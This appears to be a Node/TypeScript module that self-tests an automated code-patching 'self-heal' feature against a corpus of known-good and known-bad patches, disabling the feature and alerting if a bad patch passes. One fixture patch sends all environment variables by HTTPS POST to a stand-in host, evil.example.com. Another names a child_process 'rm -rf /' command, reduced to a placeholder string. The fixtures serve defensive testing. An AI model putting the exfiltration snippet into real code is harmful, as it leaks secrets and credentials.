'use strict';

const fs = require('fs');
const path = require('path');
const { PROJECT_ROOT } = require('./project-root');

let _deps: Record<string, any> = {};

function _injectDependencies(deps: Record<string, any>) { _deps = deps; }
function log(msg: string, level?: string, mod?: string) { _deps.logger?.log?.(msg, level, mod) ?? console.log(msg); }
function logError(msg: string, err: Error, ctx?: any) { _deps.logger?.logError?.(msg, err, ctx) ?? console.error(msg, err); }
function logAudit(msg: string, mod?: string) { _deps.logger?.logAudit?.(msg, mod) ?? console.log(msg); }

const CONFIG = require('./get-config');
function getDb() { return _deps.database?.db; }
function getUpdateConfig() { return _deps.config?.updateConfig; }
function getAuditPatch() { return _deps.selfHealAuditor?.auditPatch; }
function getExecutePatchInSandbox() { return _deps.sandboxExecutor?.executePatchInSandbox; }
function getSendAlert() { return _deps.alerting?.sendAlert || (() => {}); }

const CORPUS_DIR = path.join(PROJECT_ROOT, 'test', 'self-heal-corpus');

let SELF_HEAL_ENABLED = true;
let _lastResults: any = null;
let _testTimer: any = null;
let _startupTimer: any = null;

class HealerSelfTest {
  duration: any;
  expectedVerdict: any;
  actualVerdict: any;
  filename: any;

  constructor() {
  }

  ensureCorpusExists() { 
    try {
      if (fs.existsSync(CORPUS_DIR)) {
        const files = fs.readdirSync(CORPUS_DIR).filter((f: any) => f.endsWith('.patch'));
        if (files.length > 0) {
          log('Test corpus directory already exists with patches', 'DEBUG', 'meta-self-test');
          return;
        }
      }
      fs.mkdirSync(CORPUS_DIR, { recursive: true });
      log('Creating default self-heal test corpus', 'INFO', 'meta-self-test');

      const defaultPatches = [
        {
          filename: '01-malicious-rm-rf.patch',
          frontmatter: {
            expected_verdict: 'reject',
            reason: 'malicious',
            description: 'Contains require child_process exec rm -rf /'
          },
          patch: `const { exec } = require('child_process');
const __dangerous_test_placeholder = 'rm-rf-slash-blocked';`
        },
        {
          filename: '02-malicious-env-exfil.patch',
          frontmatter: {
            expected_verdict: 'reject',
            reason: 'malicious',
            description: 'Contains process.env exfiltration via https'
          },
          patch: `const data = JSON.stringify(process.env);
const https = require('https');
const req = https.request('https://evil.example.com/collect', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
}, () => {});
req.write(data);
req.end();`
        },
        {
          filename: '03-syntactically-broken.patch',
          frontmatter: {
            expected_verdict: 'reject',
            reason: 'syntax_error',
            description: 'Missing closing bracket causes syntax error'
          },
          patch: `function brokenPatch(data) {
  const result = data.map(item => {
    return item.value;
  // missing closing bracket for function and map
`
        },
        {
          filename: '04-semantic-type-error.patch',
          frontmatter: {
            expected_verdict: 'reject',
            reason: 'semantic_error',
            description: 'Returns wrong types, would break caller'
          },
          patch: `function getSelectorForState(state) {
  // Should return a string selector but returns a number
  return 42;
}`
        },
        {
          filename: '05-safe-noop.patch',
          frontmatter: {
            expected_verdict: 'accept',
            reason: 'safe',
            description: 'Valid no-op patch that should be accepted'
          },
          patch: `// This is a safe no-op comment patch
// It does not modify any behavior
// It only adds documentation
const SAFE_NOOP = true;`
        }
      ];

      for (const entry of defaultPatches) {
        const filePath = path.join(CORPUS_DIR, entry.filename);
        const frontmatterStr = JSON.stringify(entry.frontmatter);
        const content = `${frontmatterStr}\n---PATCH---\n${entry.patch}\n`;
        fs.writeFileSync(filePath, content, 'utf-8');
        log(`Created corpus patch: ${entry.filename}`, 'DEBUG', 'meta-self-test');
      }

      log(`Created ${defaultPatches.length} default test patches in ${CORPUS_DIR}`, 'INFO', 'meta-self-test');
    } catch (err: any) {
      logError('Failed to ensure corpus directory exists', err);
    }
  }

  _parseCorpusFile(filePath: any) { 
    try {
      const content = fs.readFileSync(filePath, 'utf-8');
      const separatorIndex = content.indexOf('\n---PATCH---\n');
      if (separatorIndex === -1) {
        log(`Invalid corpus file format (no separator): ${filePath}`, 'WARN', 'meta-self-test');
        return null;
      }
      const frontmatterStr = content.substring(0, separatorIndex).trim();
      const patchContent = content.substring(separatorIndex + '\n---PATCH---\n'.length).trim();

      const frontmatter = JSON.parse(frontmatterStr);
      return {
        frontmatter,
        patch: patchContent,
        filename: path.basename(filePath)
      };
    } catch (err: any) {
      logError(`Failed to parse corpus file: ${filePath}`, err);
      return null;
    }
  }

  async runSelfTest() { 
    log('Starting healer self-test', 'INFO', 'meta-self-test');
    const startTime = Date.now();
    const results = {
      timestamp: startTime,
      passed: true,
      totalTests: 0,
      passedTests: 0,
      failedTests: 0,
      failures: []
    };

    this.ensureCorpusExists();

    let patchFiles;
    try {
      patchFiles = fs.readdirSync(CORPUS_DIR)
        .filter((f: any) => f.endsWith('.patch'))
        .map((f: any) => path.join(CORPUS_DIR, f))
        .sort();
    } catch (err: any) {
      logError('Failed to read corpus directory', err);
      results.passed = false;
      (results.failures as any[]).push({ filename: 'N/A', reason: 'Cannot read corpus directory' });
      _lastResults = results;
      this._logEvent('self_test', JSON.stringify(results));
      return results;
    }

    if (patchFiles.length === 0) {
      log('No corpus patches found, test is vacuous', 'WARN', 'meta-self-test');
      _lastResults = results;
      this._logEvent('self_test', JSON.stringify(results));
      return results;
    }

    for (const filePath of patchFiles) {
      const entry = this._parseCorpusFile(filePath);
      if (!entry) {
        results.totalTests++;
        results.failedTests++;
        (results.failures as any[]).push({ filename: path.basename(filePath), reason: 'Parse error' });
        continue;
      }

      results.totalTests++;
      const { frontmatter, patch, filename } = entry;
      const expectedVerdict = (frontmatter.expected_verdict || 'reject').toLowerCase();
      const testResult = { filename, expectedVerdict, actualVerdict: 'unknown', auditResult: null, sandboxResult: null };

      try {
        // Step 1: Run through auditor
        const auditResult = await getAuditPatch()?.(patch);
        testResult.auditResult = auditResult;

        if (!auditResult.safe) {
          testResult.actualVerdict = 'reject';
        } else {
          // Step 2: Run through sandbox executor
          try {
            const sandboxResult = await getExecutePatchInSandbox()?.(patch, '/tmp/self-heal-test-dummy.js');
            if (sandboxResult && sandboxResult.safe) {
// @ts-expect-error
              testResult.sandboxResult = 'passed';
              testResult.actualVerdict = 'accept';
            } else {
              testResult.sandboxResult = sandboxResult?.error || 'Sandbox returned unsafe';
              testResult.actualVerdict = 'reject';
            }
          } catch (sandboxErr: any) {
            testResult.sandboxResult = sandboxErr.message;
            // Sandbox failure could be syntax error or runtime error
            testResult.actualVerdict = 'reject';
          }
        }
      } catch (err: any) {
        logError(`Self-test error for ${filename}`, err);
        testResult.actualVerdict = 'error';
      }

      // Compare actual vs expected
      const verdictMatch = testResult.actualVerdict === expectedVerdict ||
        (expectedVerdict === 'reject' && testResult.actualVerdict === 'error');

      if (verdictMatch) {
        results.passedTests++;
        log(`PASS: ${filename} - expected ${expectedVerdict}, got ${testResult.actualVerdict}`, 'INFO', 'meta-self-test');
      } else {
        results.failedTests++;
        results.passed = false;
        (results.failures as any[]).push(testResult);
        log(`FAIL: ${filename} - expected ${expectedVerdict}, got ${testResult.actualVerdict}`, 'ERROR', 'meta-self-test');
      }
    }

    (results as any).duration = Date.now() - startTime;
    _lastResults = results;

    // Critical check: if any known-bad patch was accepted, disable self-heal immediately
    const badPatchAccepted = results.failures.find(f =>
      (f as any).expectedVerdict === 'reject' && (f as any).actualVerdict === 'accept'
    );

    if (badPatchAccepted) {
// @ts-expect-error
      log(`CRITICAL: Known-bad patch was ACCEPTED by healer: ${badPatchAccepted.filename}`, 'ERROR', 'meta-self-test');
// @ts-expect-error
      this.disableSelfHeal(`Self-test detected acceptance of malicious patch: ${badPatchAccepted.filename}`);
    }

    this._logEvent('self_test', JSON.stringify({
      passed: results.passed,
      total: results.totalTests,
      passedCount: results.passedTests,
      failedCount: results.failedTests,
// @ts-expect-error
      duration: results.duration
    }));

// @ts-expect-error
    log(`Self-test complete: ${results.passedTests}/${results.totalTests} passed in ${results.duration}ms`, results.passed ? 'INFO' : 'ERROR', 'meta-self-test');
    return results;
  }

  disableSelfHeal(reason: any) { 
    try {
      SELF_HEAL_ENABLED = false;
      getUpdateConfig()?.('SELF_HEAL_ENABLED', false);

      log(`SELF-HEAL DISABLED: ${reason}`, 'ERROR', 'meta-self-test');
      try { getSendAlert()('SELF-HEAL DISABLED: ' + reason, 1); } catch (e: any) { /* non-critical */ }

      this._logEvent('disabled', reason);

      try {
        getDb()?.prepare('INSERT OR REPLACE INTO calibration (key, value, updated_at) VALUES (?, ?, ?)')
          ?.run('self_heal_enabled', 'false', Date.now());
      } catch (dbErr: any) {
        logError('Failed to persist self-heal disabled state', dbErr);
      }
    } catch (err: any) {
      logError('Error disabling self-heal', err);
    }
  }

  enableSelfHeal() { 
    try {
      SELF_HEAL_ENABLED = true;
      getUpdateConfig()?.('SELF_HEAL_ENABLED', true);
      log('Self-heal re-enabled', 'INFO', 'meta-self-test');
      this._logEvent('enabled', 'Manual re-enable');

      getDb()?.prepare('INSERT OR REPLACE INTO calibration (key, value, updated_at) VALUES (?, ?, ?)')
        ?.run('self_heal_enabled', 'true', Date.now());
    } catch (err: any) {
      logError('Error enabling self-heal', err);
    }
  }

  _logEvent(phase: any, triggerReason: any) { 
    try {
      getDb()?.prepare('INSERT INTO self_heal_events (feature_id, phase, timestamp, trigger_reason) VALUES (?, ?, ?, ?)')
        ?.run('meta-self-test', phase, Date.now(), triggerReason);
    } catch (err: any) {
      logError('Failed to log self-heal event', err);
    }
  }

  getResults() { 
    return _lastResults;
  }

  start(intervalMs: any) { 
    try {
      const interval = intervalMs != null
        ? intervalMs
        : (CONFIG.HEALER_SELF_TEST_INTERVAL_HOURS || 168) * 60 * 60 * 1000;

      this.ensureCorpusExists();

      // Run once 10 minutes after startup
      _startupTimer = setTimeout(async () => {
        try {
          await this.runSelfTest();
        } catch (err: any) {
          logError('Startup self-test failed', err);
        }
      }, 10 * 60 * 1000);
      if (_startupTimer && _startupTimer.unref) _startupTimer.unref();

      // Periodic scheduler
      _testTimer = setInterval(async () => {
        try {
          await this.runSelfTest();
        } catch (err: any) {
          logError('Periodic self-test failed', err);
        }
      }, interval);
      if (_testTimer && _testTimer.unref) _testTimer.unref();

      log(`Healer self-test started (interval: ${Math.round(interval / 60000)}min, first run in 10min)`, 'INFO', 'meta-self-test');
    } catch (err: any) {
      logError('Failed to start healer self-test', err);
    }
  }

  stop() { 
    if (_testTimer) { clearInterval(_testTimer); _testTimer = null; }
    if (_startupTimer) { clearTimeout(_startupTimer); _startupTimer = null; }
    log('Healer self-test stopped', 'INFO', 'meta-self-test');
  }

  isSelfHealEnabled() { 
    return SELF_HEAL_ENABLED;
  }
}

const healerSelfTest = new HealerSelfTest();
module.exports = { HealerSelfTest, healerSelfTest , _injectDependencies };